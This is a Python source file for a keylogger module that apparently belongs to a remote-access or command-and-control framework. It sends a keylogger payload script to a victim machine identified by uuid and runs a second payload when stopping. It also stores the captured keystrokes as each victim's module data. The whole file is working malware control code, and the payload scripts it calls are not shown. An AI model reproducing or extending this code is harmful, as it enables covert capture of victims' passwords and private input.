from dataManager.repository.userRepository import UserRepository
import logging

class KeyloggerModule:
    def __init__(self, user_repository: UserRepository):
        self.module_name = "keylogger"
        self.user_repository: UserRepository = user_repository

    async def inject(self, uuid):
        user = self.user_repository.get_user(uuid)
        r = await user.execute("./modules/payloads/payload_keylogger.py")
        logging.info(f"Sent keylogger to {uuid}. Response: {r}")
        return {"message": "Keylogger started"}
    
    async def stop(self, uuid):
        user = self.user_repository.get_user(uuid)
        r = await user.execute("./modules/payloads/payload_send_keys.py", {
            b"TO_REPLACE_WITH_KEYS": b"Supe4Pa55wOrd",
            b"TO_REPLACE_WITH_SPECIAL_KEYS": b"None"
        })
        logging.info(f"Stopped keylogger on {uuid}. Response: {r}")
        return {"message": "Keylogger stopped"}

    async def action(self, message, uuid):
        keylogger_data = self.user_repository.get_user(uuid).module_data.get(self.module_name, "")
        self.user_repository.set_user_module_data(uuid, self.module_name, keylogger_data + message)
